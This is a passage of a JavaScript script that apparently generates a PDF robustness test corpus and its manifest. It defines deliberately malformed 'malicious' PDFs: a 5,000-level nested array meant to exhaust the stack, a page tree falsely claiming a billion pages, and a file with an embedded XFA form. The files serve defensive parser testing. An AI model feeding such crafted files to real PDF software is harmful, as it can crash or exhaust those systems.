}
add(
  'malicious',
  'deep-nesting',
  'Array nested 5,000 levels deep (stack exhaustion risk).',
  save(buildDoc({ catalogExtra: ` /Deep ${'['.repeat(5000)}${']'.repeat(5000)}` })),
  null,
);
add(
  'malicious',
  'huge-page-count',
  'Page tree claims 1,000,000,000 pages but has one.',
  (() => {
    const doc = buildDoc();
    doc.w.set(
      doc.ctx.pagesNode,
      `<< /Type /Pages /Kids [${doc.ctx.pageRefs[0]} 0 R] /Count 1000000000 >>`,
    );
    return save(doc);
  })(),
  null,
);
{
  const doc = buildDoc();
  const xfa = doc.w.stream(
    '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template><subform><field name="x"/></subform></template></xdp:xdp>',
  );
  doc.w.set(
    doc.root,
    `<< /Type /Catalog /Pages ${doc.ctx.pagesNode} 0 R /AcroForm << /Fields [] /XFA ${xfa} 0 R >> /NeedsRendering true >>`,
  );
  add('malicious', 'xfa-form', 'XFA form (must not be rendered; XFA is disabled).', save(doc), {
    opens: true,
    pages: 1,
  });
}

// ---------------------------------------------------------------------------
// Write files and manifest
// ---------------------------------------------------------------------------
// Entries with expect === null are recorded from observed behaviour: see README.md.
const observed = JSON.parse(readFileSync(join(ROOT, 'observed.json'), 'utf8'));

rmSync(OUT, { recursive: true, force: true });
const manifest = [];
for (const e of entries) {
  const file = `${e.category}/${e.name}.pdf`;
  mkdirSync(join(OUT, e.category), { recursive: true });
  writeFileSync(join(OUT, file), e.bytes);
  const expect = e.expect ?? observed[file];
  if (!expect && !process.env.CORPUS_OBSERVE) {
    throw new Error(`${file} has no expectation; run observe.mjs and review observed.json`);
  }
  manifest.push({
    file,
    category: e.category,
    description: e.description,
    bytes: e.bytes.length,
    sha256: createHash('sha256').update(e.bytes).digest('hex'),
    expect,
  });
}
writeFileSync(join(ROOT, 'manifest.json'), `${JSON.stringify(manifest, null, 2)}\n`);
console.log(`Wrote ${manifest.length} files to ${OUT}`);
